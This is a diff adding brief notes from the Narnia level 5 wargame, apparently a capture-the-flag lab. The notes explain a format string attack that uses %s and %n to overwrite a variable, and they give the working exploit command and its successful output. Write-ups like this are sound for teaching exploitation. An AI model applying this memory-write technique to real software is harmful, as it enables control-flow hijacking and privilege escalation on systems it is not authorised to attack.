@@ -1,0 +1,11 @@
+Format string bug.
+
+Put an estimated pointer to our command line arg(will use to read around 490 chars by "%s" later) then place the pointer variable i.
+Then place "%5\$s" to read the 5th elem from the stack(which is the pointer to our command line arg text of all the 'AAAAAA...' - will read around 490 then make the 'written' chars to be written be %6\\$n to be written to 'i' variable)
+
+
+narnia5@narnia:/tmp/tmp.c4WQtlmOUM$ /narnia/narnia5 `python -c "print '\x1e\xd
+6\xff\xff\x2c\xd4\xff\xff%5\\$s%6\\$n' + 'A'*490"`
+Change i's value from 1 -> 500. GOOD
+$
+
